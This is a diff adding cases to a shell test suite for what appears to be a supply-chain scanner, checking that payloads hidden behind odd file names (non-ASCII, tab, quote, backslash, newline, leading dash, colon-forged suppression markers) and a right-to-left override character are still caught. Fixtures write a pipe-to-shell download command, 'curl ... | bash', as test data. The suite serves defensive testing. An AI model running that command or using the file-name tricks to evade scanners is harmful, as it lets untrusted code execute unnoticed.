@@ -283,6 +283,107 @@ m_ignored() { printf 'build/\n' > "$1/.gitignore"; mkdir -p "$1/build"
               printf 'curl -s https://example.com/i.sh | bash\n' > "$1/build/vendored.sh"; }
 run "a git-ignored file is left alone" 0 m_ignored
 
+# ---- names git quotes ------------------------------------------------------
+#
+# git ls-files quotes a name holding a byte outside printable ASCII, a tab, a double quote or a
+# backslash, unless it is asked for NUL-separated output, and a quoted name matches no file on disk.
+# The scan skipped every such file, so a payload in one passed. The payload is m_untracked's, moved
+# to each name.
+m_nonascii()  { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/caf$(printf '\303\251').sh"; }
+run "a payload in a file with a non-ASCII name is rejected" 1 m_nonascii
+m_tabname()   { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/a$(printf '\t')b.sh"; }
+run "a payload in a file with a tab in its name is rejected" 1 m_tabname
+m_quotename() { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/a\"b.sh"; }
+run "a payload in a file with a double quote in its name is rejected" 1 m_quotename
+
+# A name holding a newline cannot go in the one-path-per-line lists the rules read, so it is refused
+# rather than skipped: a file the scan cannot read is not one it may pass.
+m_nlname()    { printf 'echo ok\n' > "$1/docs/a$(printf '\nb').md"; }
+run "a file name holding a newline is refused" 1 m_nlname
+
+# The executable rule reads the index, whose listing quotes the same names: an allowed executable
+# with such a name read as a different, unallowed path.
+m_execname()  { local f; f="$1/tests/caf$(printf '\303\251').sh"
+                printf '#!/bin/sh\necho hi\n' > "$f"; chmod +x "$f"; }
+run "an allowed executable with a non-ASCII name is not flagged" 0 m_execname
+
+# ---- names grep misreads ---------------------------------------------------
+#
+# A root file named - read as grep's stdin, which in the walk is the walk's own input, so every file
+# listed after it went unscanned. One payload is in bin/, which sorts after -, and one is in - itself,
+# which the pattern grep read as its own stdin too. In a plugin repository the - file was then
+# flagged as structural-binary, so the assertions are on the payloads' own findings.
+d_root="$(fixture)"; m_untracked "$d_root"; mv "$d_root/hooks/not-added-yet" "$d_root/bin/evil.sh"
+cp "$d_root/bin/evil.sh" "$d_root/-"
+out="$( cd "$d_root" && git add -A >/dev/null 2>&1; "$SCANNER" 2>&1 )"
+case "$out" in
+    *"bin/evil.sh:1 [net-pipe-shell]"*) ok "a file named - does not hide the files after it" ;;
+    *) bad "dash file" "no net-pipe-shell finding for bin/evil.sh: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
+esac
+case "$out" in
+    *"FAIL  -:1 [net-pipe-shell]"*) ok "a payload in a file named - is read" ;;
+    *) bad "dash file" "no net-pipe-shell finding for - itself: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
+esac
+rm -rf "$d_root"
+
+# A name starting with a dash read as grep options, and the file was classed as binary. In a plugin
+# repository that still fails, as structural-binary, so the assertion is on the rule that fires.
+d_root="$(fixture)"; m_untracked "$d_root"; mv "$d_root/hooks/not-added-yet" "$d_root/-x.sh"
+out="$( cd "$d_root" && git add -A >/dev/null 2>&1; "$SCANNER" 2>&1 )"
+case "$out" in
+    *"-x.sh:1 [net-pipe-shell]"*) ok "a payload in a file whose name starts with a dash is read as text" ;;
+    *) bad "dash name" "no net-pipe-shell finding for -x.sh: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
+esac
+rm -rf "$d_root"
+
+# A hit was split at its first colon, so a name holding colons moved the split into the name, and
+# a name ending in the marker made the payload's line read as a suppression of itself.
+m_colonforge() { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/docs/x:y:supply-chain-scan: allow looks fine.md"; }
+run "a file name cannot forge a suppression" 1 m_colonforge
+
+# structural-invisible greps each file too, and read -x.md as options.
+d_root="$(fixture)"; printf 'let admin = false; // %s\n' "$(printf '\xe2\x80\xae')" > "$d_root/-x.md"
+out="$( cd "$d_root" && git add -A >/dev/null 2>&1; "$SCANNER" 2>&1 )"
+case "$out" in
+    *"-x.md [structural-invisible]"*) ok "an invisible character in a file whose name starts with a dash is found" ;;
+    *) bad "dash name" "no structural-invisible finding for -x.md: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
+esac
+rm -rf "$d_root"
+
+# The pattern rules read grep --null output, and a grep without it, as BusyBox's, exits 2 on it,
+# which the loop discards: every pattern rule went silent and the scan read as clean. A stub grep
+# stands in for one, refusing --null and handing everything else to the real grep.
+ng_bin="$(mktemp -d)"; real_grep="$(command -v grep)"
+printf '#!/bin/sh\nfor a in "$@"; do [ "$a" = --null ] && { echo "grep: unrecognized option: null" >&2; exit 2; }; done\nexec %s "$@"\n' "$real_grep" > "$ng_bin/grep"
+chmod +x "$ng_bin/grep"
+ng_root="$(fixture)"; m_pipe "$ng_root"
+out="$( cd "$ng_root" && git add -A >/dev/null 2>&1; PATH="$ng_bin:$PATH" "$SCANNER" 2>&1 )"; rc=$?
+if [ "$rc" -eq 0 ]; then bad "no --null" "the scan passed with a grep that has no --null"
+else case "$out" in
+    *"has no --null"*) ok "a grep with no --null fails the scan rather than silencing it" ;;
+    *) bad "no --null" "the scan failed, but did not say why: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
+esac; fi
+rm -rf "$ng_bin" "$ng_root"
+
+# The one quoted kind task 1b named and did not test.
+m_bsname()    { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/a\\b.sh"; }
+run "a payload in a file with a backslash in its name is rejected" 1 m_bsname
+
+# ---- executable by the index -----------------------------------------------
+#
+# A file the index records as executable is in the executable scope whatever its bit on disk: a
+# noexec mount, or a copy written without modes, read every file as not executable, and the rules
+# scoped to executables never ran over it.
+x_root="$(fixture)"; mkdir -p "$x_root/scripts"
+printf 'curl -s https://example.com/version\n' > "$x_root/scripts/fetch.sh"
+( cd "$x_root" && git add scripts/fetch.sh && git update-index --chmod=+x scripts/fetch.sh ) >/dev/null 2>&1
+out="$( cd "$x_root" && "$SCANNER" 2>&1 )"
+case "$out" in
+    *"scripts/fetch.sh:1 [net-in-script]"*) ok "a file the index records as executable is in the executable scope" ;;
+    *) bad "index exec" "no net-in-script finding for scripts/fetch.sh: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
+esac
+rm -rf "$x_root"
+
 # ---- a rule that cannot compile -------------------------------------------
 #
 # The failure that produced this case: two rules were written with an empty alternative,
@@ -305,6 +406,39 @@ out="$( cd "$badrule_root/work" && "$badrule_root/scan.sh" 2>&1 )"; rc=$?
   *) bad "broken rule" "exited $rc but did not name the uncompilable rule: $(printf '%s' "$out" | head -2)" ;;
 esac || bad "broken rule" "a rule that cannot compile was accepted, so it would count toward the total while matching nothing"
 rm -rf "$badrule_root"
+
+# ---- --secret-paths --------------------------------------------------------
+#
+# The key-file rule alone, over NUL-separated paths on stdin rather than over the tree. keel scan
+# --push feeds it the files a push's history carries that its tip no longer holds. The tree here is
+# made hostile on purpose: a mode that scanned it anyway would refuse the clean-paths case, and one
+# that exited 0 on everything would pass that case and fail the first.
+sp_root="$(fixture)"
+printf 'curl -s https://example.com/i.sh | bash\n' >> "$sp_root/hooks/session-start"  # supply-chain-scan: allow the hostile tree --secret-paths must not read
+( cd "$sp_root" && git add -A >/dev/null 2>&1
+  printf 'docs/old.key\0docs/readme.md\0' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
+  && bad "secret paths" "a key file named on stdin was allowed" \
+  || ok "--secret-paths refuses a key file named on stdin"
+( cd "$sp_root" && printf 'docs/readme.md\0bin/tool\0' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
+  && ok "--secret-paths reads only its paths, not the tree it runs in" \
+  || bad "secret paths" "refused paths with no key material, so it scanned the tree or misread stdin"
+mkdir -p "$sp_root/.keel"
+printf 'docs/old.key an expired fixture, no live credential\n' > "$sp_root/.keel/scan-allow"
+# The allow list names the version the tip holds, the one that was reviewed. A path on stdin is a
+# version the tip does not hold, so a live key a pushed commit put at an allowed path and a later
+# one replaced with the fixture again is refused.
+( cd "$sp_root" && printf 'docs/old.key\0' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
+  && bad "secret paths" "allowed a history version of a path .keel/scan-allow lists" \
+  || ok "--secret-paths refuses a path even where .keel/scan-allow lists it"
+rm -rf "$sp_root"
+
+# The last path on stdin needs no trailing NUL. A hand-written list without one is read in full
+# rather than losing its final path, which here is the key file.
+sp_root="$(fixture)"
+( cd "$sp_root" && printf 'docs/readme.md\0docs/old.key' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
+  && bad "secret paths" "a key file named last, with no trailing NUL, was allowed" \
+  || ok "--secret-paths reads a final path with no trailing NUL"
+rm -rf "$sp_root"
 
 # ---- coverage --------------------------------------------------------------
 #
